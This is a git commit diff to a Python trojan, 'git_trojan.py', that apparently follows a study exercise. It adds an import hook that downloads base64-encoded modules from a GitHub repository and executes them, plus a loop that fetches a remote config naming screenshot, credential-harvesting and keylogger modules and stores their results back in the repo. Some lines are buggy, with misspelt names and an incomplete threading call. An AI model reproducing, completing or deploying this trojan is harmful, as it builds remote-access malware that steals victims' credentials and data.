6c21bf8e06a62c28a4e405375fdc22f822143181
RawrRadioMouse <55473161+RawrRadioMouse@users.noreply.github.com>
2020-04-09 08:30:27 +0930

    Update git_trojan.py

--- trojan/modules/git_trojan.py
+++ trojan/modules/git_trojan.py
@@ -54,7 +54,8 @@ def get_file_contents(filepath):
 
     return None
 
-# retrieves the remote config.JSON doc so that the trojan knows which modules to run (screenshots, cred harvesting, keylogger, pranks etc)
+# retrieves the remote config.JSON doc so that the trojan knows which modules to run
+#(screenshots, cred harvesting, keylogger, pranks etc)
 def get_trojan_config():
     global configured
     config_json = get_file_contents(trojan_config)
@@ -81,4 +82,74 @@ def store_module_result(data):
 
 #repo.create_file(remote_path,"Commit message",base64.b64encode(data))
 
+################################################################################
+#this code will be added to the sys.meta_path list - so when the path is searched
+#and the required module is not there, our program will go and pull it in
+class GitImporter(object):
+    def __init__(self):
+        self.current_module_code = ""
 
+#the find_module will be called in first to see if we can locate the missing module
+#in our repo first        
+    def find_module(self,fullname,path=None):
+        if configured:
+            print ("[*] Attempting to retrieve {}".format(fullname))
+            new_library = get_file_contents("modules/{}".format(fulname))
+#we base64 decode the code and store it in our class
+            if new_library is not None:
+                self.current_module_code = base64.b64decode(new_library)
+            
+                return self
+#by returning self we tell python that we found some code and it can call load_module
+#function to load it - achieved by call native imp module to load a blank module and feed
+#our located code into it. After this we need to inject our pieced together module into
+#the sys.modules [[RESEARCH sys.modules]] list so that it can be reused for any future
+#import calls
+            
+        return None
+
+    def load_module(self,name):
+
+        module = imp.new_module(name)
+        exec (self.current_module_code) in module.__dict__
+        sys.modules[name] = module
+
+        return module
+
+#notes on what is going on here:
+    #We define the objects called by class, the objects will work in tandem to locate/create
+    #missing modules
+    #class will be called when module is not found
+################################################################################
+
+#custom module importer to work in tandem with our import hack code
+#simply runs through each module within the trojan config file
+def module_runner(module):
+
+    task_queue.put(1)
+    result = sys.modules[modules].run()
+    task_queue.get()
+
+    #store result in our repo
+    store_module_result(result)
+
+    return
+
+#main trojan loop - we point the meta_path to our class, which will recursively
+#look for the module and pull it in should it not exist
+sys.meta_path = [GitImporter()]
+
+#here we are very basically saying that, if there are no tasks/modules to run
+#then go and grab a config containing modules to run using the function we
+#created earlier
+while True:
+
+    if task_queue.empty():
+
+        config = get_trojan_config()
+#we utilise the threading library and create a thread object, feeding it args of
+#task and module we want
+        for task in config:
+            t = threading.Threaded
+            t.start()
+            time.sleep(random.randint(1,10))
